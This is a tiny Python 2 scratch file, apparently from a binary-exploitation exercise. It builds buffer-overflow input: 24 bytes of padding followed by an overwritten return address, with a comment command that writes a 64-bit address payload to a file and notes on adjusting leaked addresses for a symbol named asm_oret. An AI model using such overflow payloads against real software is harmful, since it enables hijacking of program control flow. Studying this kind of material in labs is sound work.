base= 'tmp'

print 'a'*24 + '\xff\xff\xff\xff'

#   0000000000008c17 t asm_oret

#   python -c "print 'a'*24 + '\x1a\x0c\xbe\xe5\x52\x7f\x00\x00' + '\xaa\xaa\xaa\xaa\xaa\xaa\xaa\xaa\xaa\xaa\xaa' " > tmp

# 7F29738CEC17 => skip first addr --> 0x7f 29 73 8c ec 1a
# 7F52E5BE0C17 --> 7F 52 E5 BE 0C 1a